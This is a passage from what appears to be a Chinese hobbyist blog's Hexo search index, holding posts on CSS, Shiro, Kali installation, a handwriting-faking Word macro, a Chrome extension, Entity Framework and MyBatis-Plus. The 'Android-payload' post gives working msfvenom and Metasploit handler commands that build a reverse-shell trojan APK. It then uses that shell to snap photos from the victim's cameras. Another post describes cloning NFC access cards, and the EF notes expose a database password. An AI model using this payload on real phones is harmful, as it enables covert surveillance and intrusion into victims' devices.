class="number">#00a67c</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">to</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span> <span class="number">#fff</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">35px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">40px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">50px</span> <span class="number">#00a67c</span>,</span></span><br><span class="line"><span class="css">                     <span class="number">0</span> <span class="number">0</span> <span class="number">75px</span> <span class="number">#00a67c</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>背景颜色透明</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background</span>: transparent</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>layui+shiro</title>
      <link href="/2020/09/21/java-layui/"/>
      <url>/2020/09/21/java-layui/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="layui"><a href="#layui" class="headerlink" title="layui"></a>layui</h2><ul><li>默认选中<br>class = “layui-this”</li></ul><h2 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h2><p>anon: 无需认证<br>authc: 必须认证<br>authBasic: 需要验证通过HTTPBasic认证</p><p>user:不一定通过验证,只要曾经被shiro记录过即可</p><p>perms: 必须拥有某个权限才能访问<br>role: 必须拥有某个角色才能访问<br>port: 请求必须是指定值才可以<br>rest: 请求必须基于RESTful,POST,PUT,GET, DELETE<br>ssl:必须是安全的URL请求,协议HTTPS</p><p>创建三个页面<br>main.html , manage.html ,adminstator.html<br>访问权限如下:</p><ol><li>必须登录才能访问main.html</li><li>当前用户必须拥有manage授权才能访问manage.html</li><li>当前用户必须拥有adminstator角色权限才能访问adminstator.html</li></ol><hr><h2 id="layui-1"><a href="#layui-1" class="headerlink" title="layui"></a>layui</h2><hr><p>附上java学习大礼包:<br><a href="https://github.com/ityouknow">https://github.com/ityouknow</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Android-payload</title>
      <link href="/2020/08/12/Android-payload/"/>
      <url>/2020/08/12/Android-payload/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>打开终端，安装ufw防火墙，开启5555端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ufw</span><br><span class="line">sudo ufw <span class="built_in">enable</span></span><br><span class="line">sudo ufw allow 5555</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.220 LPORT=5555 R &gt; ./a.apk</span><br></pre></td></tr></table></figure><p>sudo ifconfig</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.0.113</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">//注意被侵入对象需要给我们的木马文件一些权限，诸如访问电话，信息，录音，相机，手机存储等权限</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webcam_snap -i 1//前置摄像头采集照片</span><br><span class="line">webcam_snap -i 2 //后置摄像头采集照片</span><br></pre></td></tr></table></figure><p>注意:<code>当有一会时间未及时操作便出现会连接超时，用户需再次点击木马文件，才能继续操作.</code></p>]]></content>
      
      
      <categories>
          
          <category> Payload </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Payload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解NFC,走向玩卡之路</title>
      <link href="/2020/07/24/NFC/"/>
      <url>/2020/07/24/NFC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>由于最近温习了一遍单机游戏,良心发现于是水文一篇,以表示区区还没真正达到无药可救的地步。<br>别问我为什么总是半夜写博客,灵感来了就想水一篇…<br>由于最近感觉出门还要想着带着门禁卡,真nm麻烦…我知道手机nfc这功能挺方便<br>还是穷的缘故…手机没这功能,而且据说此功能对加密卡也没辙..emmm…今天就适当了解一下</p><hr><h2 id="0x01-NFC介绍"><a href="#0x01-NFC介绍" class="headerlink" title="0x01 NFC介绍"></a>0x01 NFC介绍</h2><p>NFC—-近场通信(Near Field Communication,NFC)<br>NFC是一种近距离的私密通信方式,强调信息交互,使用短距高频的无线电技术，在13.56MHz频率运行于20厘米距离内。其传输速度有106 Kbit/秒、212 Kbit/秒或者424 Kbit/秒三种。<br>与RFID一样，NFC信息也是通过频谱中无线频率部分的电磁感应耦合方式传递,是一种提供轻松、安全、迅速的通信的无线连接技术。其传输范围比RFID小，但由于NFC采取了独特的信号衰减技术，相对于RFID来说NFC具有距离近、带宽高、能耗低等特点。<br>RFID的传输范围可以达到几米、甚至几十米<br>NFC技术支持多种应用，相互认证和动态加密和一次性钥匙(OTP),包括移动支付与交易、对等式通信及移动中信息访问等。<br>卡模式:有一个极大的优点，那就是卡片通过非接触读卡器的 RF 域来供电，即便是寄主设备（如手机）没电也可以工作。</p><hr><h2 id="0x02手机NFC原理"><a href="#0x02手机NFC原理" class="headerlink" title="0x02手机NFC原理"></a>0x02手机NFC原理</h2><p>手机NFC设备只能模拟非加密IC卡的卡号信息,（0扇区），而加密卡的加密信息都是在1-15扇区.<br>将原卡的卡号数据(0扇区)复制到空白UID（CUID）卡上（0扇区的复制），得到一张含有原卡卡号的非加密IC卡，手机等设备就可以模拟出原卡卡号，最后用复制器将原卡剩余15个扇区的加密数据写入到手机等NFC设备中。<br>手机可以下载MCT(MifareClassicTool)这个软件扫描卡的类型。主要破解类型是M1卡（NXP Mifare1系），M1指是采用恩智浦芯片，常用的有S50及S70两种型号。常见的有卡式和钥匙扣式，SAK为08或18。</p><hr><h2 id="0x03-区分卡"><a href="#0x03-区分卡" class="headerlink" title="0x03 区分卡"></a>0x03 区分卡</h2><table><thead><tr><th></th><th>IC卡</th><th>ID卡</th><th>IC、ID复合卡</th></tr></thead><tbody><tr><td>强光照射法</td><td>内部线圈为方形</td><td>内部线圈为圆形</td><td>线圈为方形+圆形且有两个小芯片</td></tr><tr><td>编号判断法</td><td>表面没有任何信息,或不是以“00”开头的十位数字,90%基本可以确定为IC卡，而且都是加密的，电梯卡一般都是IC卡。</td><td>“00”开头的八位或十位数字</td><td></td></tr><tr><td>工作频率</td><td>13.56MHz</td><td>125KHz</td><td></td></tr></tbody></table><p>IC为1kb大小，分为16个扇区，每个扇区4个块，一共64个块，通常每个扇区块3为存储密钥；0扇区为卡的厂商信息和卡序列号。IC卡有:UID卡，cuid卡，fuid卡。我们通常用的卡都是uid卡，如果有的NFC读头和系统防火墙可以识别到复制的卡如果是UID类型的卡，就会出现没反应，白复制了。<br><code>注:手机、手环等NFC设备的工作频率也是13.56MHz,手机的NFC功能能感应到IC卡，不能感应到ID卡</code></p><p>有些IC加密卡直接可以用MCT(Mifare Classic Tools）读出来，并且如果只需要0扇区的信息，也不用买额外设备，复制更简单。<br>带金额的卡或者有的锁定楼层的电梯卡基本上就只能上PM3来复制或更改了。</p><hr><h2 id="0x04-设备介绍"><a href="#0x04-设备介绍" class="headerlink" title="0x04 设备介绍"></a>0x04 设备介绍</h2><p>对于加密的IC卡，如果想读取卡中的数据，首先需要获取所有扇区的KEYA或者KEYB，一般密钥都是保密的，我们手上只有卡的情况下，解密则需要通过硬件支持了，比如pn532、acr122u、proxmark3等，笔者使用的是Proxmark3，忽略性价比因素，相比于其它傻瓜式设备，proxmark3的功能更全面些，可玩性也更高</p><ul><li>PM3:proxmark3是一款开源的RFID安全研究平台黑色按钮从图中我们可以看到左上方有一颗黑色按钮，这个按钮就是Proxmark3的功能键，主要用于启动嗅探模式以及停止进程功能，其中内置高频和低频天线，能够识别和读取大部分的RFID卡片，并且国产的PM3还可以通过转接头等工具和手机等智能设备进行连接，从而实现跨平台的使用。</li></ul><hr><p>参考:<br><a href="https://www.cnblogs.com/jiftle/p/6747406.html">https://www.cnblogs.com/jiftle/p/6747406.html</a><br><a href="https://www.freebuf.com/news/special/80786.html">https://www.freebuf.com/news/special/80786.html</a><br><a href="https://post.smzdm.com/p/aqnlper7/">https://post.smzdm.com/p/aqnlper7/</a></p><p><a href="https://zhuanlan.zhihu.com/p/81384126">https://zhuanlan.zhihu.com/p/81384126</a><br><a href="https://www.bbsmax.com/A/MyJxYEo25n/">https://www.bbsmax.com/A/MyJxYEo25n/</a><br><a href="http://pm3.echo.cool/index.php/2018/08/20/pm3%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/">http://pm3.echo.cool/index.php/2018/08/20/pm3%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RFID </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装kali系统之采坑记---固态硬盘安装kali</title>
      <link href="/2020/07/20/kali-U/"/>
      <url>/2020/07/20/kali-U/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>需要kali镜像,VMware,DiskGenius<br>kali-linux-2020.2-live-amd64.iso<br>正常安装步骤省略…如有需要可参考文末链接<br>创建步骤完成后修改以下地方<br><img src="https://q0o0p.top/2020/07/20/kali-U/1.png"><br><img src="https://q0o0p.top/2020/07/20/kali-U/2.png"><br>然后开启虚拟机<br><img src="https://q0o0p.top/2020/07/20/kali-U/3.png"><br>前面默认,部分地方自行修改,分区时选择手动分区<br>最终分区结果如下<br><img src="https://q0o0p.top/2020/07/20/kali-U/4.png"><br>是否选用网络镜像,选择否<br>结束后打开分区软件DiskGenius<br>在右侧找到系统所在盘中的EFI(大小约100MB左右的FAT32分区),再点击上面的“浏览文件”标签<br><img src="https://q0o0p.top/2020/07/20/kali-U/5.png"><br>双击EFI文件夹,进入后看到一个名为kali的文件夹，右键重命名为boot<br><img src="https://q0o0p.top/2020/07/20/kali-U/6.png"><br>双击进入我们刚刚重命名好的boot文件夹，会看到一个名为grubx64.efi的文件，右键重命名为bootx64.efi<br><img src="https://q0o0p.top/2020/07/20/kali-U/7.png"></p><p>重启电脑,华硕f2进入BIOS<br><img src="https://q0o0p.top/2020/07/20/kali-U/8.jpg"><br>F7进入菜单栏设置–&gt;选择Security–&gt;找到Secure Boot<br><img src="https://q0o0p.top/2020/07/20/kali-U/9.jpg"><br>将Secure Boot Control设置为Disabled<br><img src="https://q0o0p.top/2020/07/20/kali-U/10.jpg"><br>Boot–&gt;CSM Support–&gt;Disabled<br><img src="https://q0o0p.top/2020/07/20/kali-U/11.jpg"><br>保存并退出,进入kali<br><img src="https://q0o0p.top/2020/07/20/kali-U/12.png"></p><hr><p>参考:<br><a href="https://blog.csdn.net/yanhanhui1/article/details/103134944">https://blog.csdn.net/yanhanhui1/article/details/103134944</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>模拟手写---打印&#39;手写体&#39;</title>
      <link href="/2020/06/29/Simulation-Handwritten/"/>
      <url>/2020/06/29/Simulation-Handwritten/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>xxxx实习,手写几十页报告…<br>emmm…出于探索学习新东西的目的…(原因…略)<br>开启了制作逼真’手写报告’的实验之旅…</p><h2 id="1-准备字体库"><a href="#1-准备字体库" class="headerlink" title="1. 准备字体库"></a>1. 准备字体库</h2><p>安装一些字形相近的手写字体.</p><h2 id="2-安装word宏-没自带的情况下需要安装-创建宏"><a href="#2-安装word宏-没自带的情况下需要安装-创建宏" class="headerlink" title="2. 安装word宏(没自带的情况下需要安装),创建宏"></a>2. 安装word宏(没自带的情况下需要安装),创建宏</h2><p>wps创建word 宏 :<br>【工具】-【js宏】-【宏编辑器】</p><p><img src="https://q0o0p.top/2020/06/29/Simulation-Handwritten/1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Sub 字体修改()</span><br><span class="line">&#x27;</span><br><span class="line">&#x27; 字体修改 宏</span><br><span class="line">&#x27;</span><br><span class="line">    Dim R_Character As Range</span><br><span class="line"></span><br><span class="line">    Dim FontSize(5)</span><br><span class="line">    &#x27; 字体大小在5个值之间进行波动，可以改写</span><br><span class="line">    FontSize(1) = &quot;21&quot;</span><br><span class="line">    FontSize(2) = &quot;21.5&quot;</span><br><span class="line">    FontSize(3) = &quot;22&quot;</span><br><span class="line">    FontSize(4) = &quot;22.5&quot;</span><br><span class="line">    FontSize(5) = &quot;23&quot;</span><br><span class="line"></span><br><span class="line">    Dim FontName(3)</span><br><span class="line">    &#x27;字体名称在三种字体之间进行波动，可改写，但需要保证系统拥有下列字体</span><br><span class="line">    FontName(1) = &quot;钟齐陈伟勋硬笔行书字库&quot;</span><br><span class="line">    FontName(2) = &quot;王金彦行书20123800&quot;</span><br><span class="line">    FontName(3) = &quot;Aa浅山行书 (非商业使用)&quot;</span><br><span class="line"></span><br><span class="line">    Dim ParagraphSpace(5)</span><br><span class="line">    &#x27;行间距 在一定以下值中均等分布，可改写</span><br><span class="line">    ParagraphSpace(1) = &quot;12&quot;</span><br><span class="line">    ParagraphSpace(2) = &quot;13&quot;</span><br><span class="line">    ParagraphSpace(3) = &quot;20&quot;</span><br><span class="line">    ParagraphSpace(4) = &quot;7&quot;</span><br><span class="line">    ParagraphSpace(5) = &quot;12&quot;</span><br><span class="line"></span><br><span class="line">    For Each R_Character In ActiveDocument.Characters</span><br><span class="line">        VBA.Randomize</span><br><span class="line"></span><br><span class="line">        R_Character.Font.Name = FontName(Int(VBA.Rnd * 3) + 1)</span><br><span class="line">        R_Character.Font.Size = FontSize(Int(VBA.Rnd * 5) + 1)</span><br><span class="line">        R_Character.Font.Position = Int(VBA.Rnd * 3) + 1</span><br><span class="line">        R_Character.Font.Spacing = 0</span><br><span class="line"></span><br><span class="line">    Next</span><br><span class="line">    Application.ScreenUpdating = True</span><br><span class="line">    For Each Cur_Paragraph In ActiveDocument.Paragraphs</span><br><span class="line">        Cur_Paragraph.LineSpacing = ParagraphSpace(Int(VBA.Rnd * 5) + 1)</span><br><span class="line">    Next</span><br><span class="line">        Application.ScreenUpdating = True</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><h2 id="3-调整"><a href="#3-调整" class="headerlink" title="3. 调整"></a>3. 调整</h2><p>如果对结果不满意，可以多运行几次宏，找到合适的一版，再微调一下<br>实验结果如图:<br><img src="https://q0o0p.top/2020/06/29/Simulation-Handwritten/2.jpg"></p><hr><p>参考:<br><a href="https://zhuanlan.zhihu.com/p/97163374">https://zhuanlan.zhihu.com/p/97163374</a><br><a href="https://www.zhihu.com/question/20308770">https://www.zhihu.com/question/20308770</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Chrome插件--右键实现存储功能</title>
      <link href="/2020/06/29/Chrome-plugin/"/>
      <url>/2020/06/29/Chrome-plugin/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近课设和大作业一天一个真是,忙得不可开交…<br>(事实是—最近又懒了,最后一天效率MAX—–QAQ)<br>在查资料的过程中,信息零零散散,每次都要用Ctrl+C然后还要Ctrl+V….<br>特别是有些网页,太狗了,复制还要用到F12<br>唉!对于像我这样的人,还是希望能有更方便的用法<br>然后就有了这个标题~~<br>(最近刚研究了一下WPS的word宏手写体,在家手抄几十页的报告…不存在的,O(∩_∩)O)<br>手写,查资料可以懒,但敲代码不能懒!<br>下面进入正题….</p><hr><h2 id="制作简易的右键插件"><a href="#制作简易的右键插件" class="headerlink" title="制作简易的右键插件"></a>制作简易的右键插件</h2><ul><li>需要准备的文件<br>任意路径下创建一个文件夹,名字自拟<br>chrome插件至少包含json,js两个文件：</li></ul><p>1.manifest.json<br>manifest.json就是一个配置文件，配置了插件的名称，插件所需引用的js脚本文件等等。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line"><span class="attr">&quot;name&quot;</span>: <span class="string">&quot;q0o0p&quot;</span>, </span><br><span class="line"><span class="attr">&quot;description&quot;</span>: <span class="string">&quot;翻译&quot;</span>, </span><br><span class="line"><span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.1&quot;</span>, </span><br><span class="line"><span class="attr">&quot;permissions&quot;</span>: [<span class="string">&quot;contextMenus&quot;</span>, <span class="string">&quot;tabs&quot;</span>], </span><br><span class="line"><span class="attr">&quot;icons&quot;</span>: </span><br><span class="line">&#123; </span><br><span class="line">   <span class="attr">&quot;16&quot;</span>: <span class="string">&quot;sicon.png&quot;</span>,  <span class="comment">//当前路径中的图标           </span></span><br><span class="line">   <span class="attr">&quot;48&quot;</span>: <span class="string">&quot;sicon.png&quot;</span>,            </span><br><span class="line">   <span class="attr">&quot;128&quot;</span>: <span class="string">&quot;sicon.png&quot;</span> </span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;background&quot;</span>: &#123; </span><br><span class="line"><span class="attr">&quot;scripts&quot;</span>: [<span class="string">&quot;menu.js&quot;</span>]  <span class="comment">//所调用的js文件</span></span><br><span class="line">&#125;, </span><br><span class="line"><span class="attr">&quot;manifest_version&quot;</span>: <span class="number">2</span>  <span class="comment">//必需是2,否则不能使用</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.xxx.js<br>xxx.js就是需要的脚本，点击菜单时需要的功能就在这个文件里写。<br>试了一个最简单的有道翻译</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chrome.contextMenus.create(&#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&#x27;q0o0p-翻译：%s&#x27;</span>, <span class="comment">// %s表示选中的文字</span></span><br><span class="line">    <span class="attr">contexts</span>: [<span class="string">&#x27;selection&#x27;</span>], <span class="comment">// 只有当选中文字时才会出现此右键菜单</span></span><br><span class="line">    <span class="attr">onclick</span>: <span class="function"><span class="keyword">function</span>(<span class="params">params</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 注意不能使用location.href，因为location是属于background的window对象</span></span><br><span class="line">        chrome.tabs.create(&#123;<span class="attr">url</span>: <span class="string">&#x27;http://www.youdao.com/w/&#x27;</span> + <span class="built_in">encodeURI</span>(params.selectionText)&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>3.xxx.png<br>找到喜欢的图片做log,这里使用的图标是以前抠过图的透明底图片</p><p><img src="https://q0o0p.top/2020/06/29/Chrome-plugin/2.png"></p><ul><li>找到Chrome插件,添加自己的插件</li></ul><p>打开Chrome右上角的”…”找到”更多工具”-&gt;”扩展程序”，加载已解压文件，选择你创建的哪个文件包，即可。</p><p><img src="https://q0o0p.top/2020/06/29/Chrome-plugin/1.png"><br><img src="https://q0o0p.top/2020/06/29/Chrome-plugin/3.png"></p><ul><li>更新插件<br>更新插件只需刷新即可<br><img src="https://q0o0p.top/2020/06/29/Chrome-plugin/4.png"></li></ul><hr><p>附上已安装的第三方插件路径:<br>C:\Users\ASUS\AppData\Local\Google\Chrome\User Data\Default\Extensions</p><p>详细插件参考:<br><a href="https://www.cnblogs.com/liuxianan/p/chrome-plugin-develop.html#%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95">https://www.cnblogs.com/liuxianan/p/chrome-plugin-develop.html#%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95</a></p><p><a href="http://open.chrome.360.cn/extension_dev/contextMenus.html">http://open.chrome.360.cn/extension_dev/contextMenus.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>EFCode</title>
      <link href="/2020/06/22/ef-code/"/>
      <url>/2020/06/22/ef-code/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>创建Demo.APP设为启动项目<br>dotnet new sln -o Demo<br>The template “Solution File” was created successfully.</p><p>dotnet new classlib -o Demo.Model<br>The template “Class library” was created successfully.</p><p>添加依赖，添加Demo.Domain项目依赖<br>dotnet add . reference ../Demo.Domain<br>dotnet add package Microsoft.EntityFrameworkCore.SqlServer</p><p>迁移命令<br>Add-Migration Initial<br>生成一个迁移脚本<br>script-migration<br>更新数据库<br>Update-Database -verbose</p><p>迁移命令<br>Add-Migration update1<br>更新数据库<br>Update-Database </p><p>连接数据库<br>Data Source=(localdb)\MSSQLLocalDB; Initial Catalog=Demo;Database=Demo;Trusted_Connection=True;server=127.0.0.1;uid=sa;pwd=126800.;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)</span><br><span class="line">&#123;</span><br><span class="line">    optionsBuilder.UseSqlServer(&quot;Data Source=(localdb)\\MSSQLLocalDB; Initial Catalog=Demo;Database=Demo;Trusted_Connection=True;server=127.0.0.1;uid=sa;pwd=126800.;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SqlException: 当 IDENTITY_INSERT 设置为 OFF 时，不能为表 ‘Students’ 中的标识列插入显式值。<br>set identity_insert notice ON</p><p>在Program.cs中添加数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">using var context = new DemContext();</span><br><span class="line"></span><br><span class="line">           var serieA = new Student</span><br><span class="line">           &#123;</span><br><span class="line">               /*s_id = 1,*/</span><br><span class="line">               s_name = &quot;wow&quot;,</span><br><span class="line">               s_age = 21,</span><br><span class="line">               s_dept = &quot;CS&quot;,</span><br><span class="line">               s_sex = &quot;女&quot;</span><br><span class="line">           &#125;;</span><br><span class="line">         /*  var serieB = new Student</span><br><span class="line">           &#123;</span><br><span class="line">               /*s_id = 1,*/</span><br><span class="line">               s_name = &quot;wow&quot;,</span><br><span class="line">               s_age = 21,</span><br><span class="line">               s_dept = &quot;CS&quot;,</span><br><span class="line">               s_sex = &quot;女&quot;</span><br><span class="line">           &#125;; */</span><br><span class="line">           var serieB = new Enrollment</span><br><span class="line">           &#123;</span><br><span class="line">              ...</span><br><span class="line">               Student = serieA</span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line">           context.AddRange(serieA, serieB);</span><br><span class="line">           //context.Students.AddRange(new List&lt;Student&gt; &#123; serieA,serieB&#125;);</span><br><span class="line">           var count = context.SaveChanges();</span><br><span class="line"></span><br><span class="line">           Console.WriteLine(count);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java Web(mybatis-plus)</title>
      <link href="/2020/05/18/mybatis-plus/"/>
      <url>/2020/05/18/mybatis-plus/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>MyBatis Plus API:<br><a href="https://mp.baomidou.com/config/#%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE">https://mp.baomidou.com/config/#%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE</a><br>mybatis plus maven包:<br><a href="https://mvnrepository.com/artifact/com.baomidou/mybatis-plus-boot-starter">https://mvnrepository.com/artifact/com.baomidou/mybatis-plus-boot-starter</a><br><a href="https://mvnrepository.com/artifact/com.baomidou/mybatis-plus">https://mvnrepository.com/artifact/com.baomidou/mybatis-plus</a></p><p>常用注解<br>默认连接数据库的方式: 驼峰式转换,类名的首字母小写映射到表名</p><ul><li>@TableName<br>映射到数据库的表名,使用此注解,类名可以和表名不一致<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.q0o0p.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableName;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer user_id;</span><br><span class="line">    <span class="keyword">private</span> String user_name;</span><br><span class="line">    <span class="keyword">private</span> String user_password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><ul><li>@TableId<br>设置主键映射,value映射主键字段名(如果成员变量名字和主键名字不一致,需要添加此注解)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@TableId(value = &quot;user_id&quot;)</span></span><br><span class="line">    <span 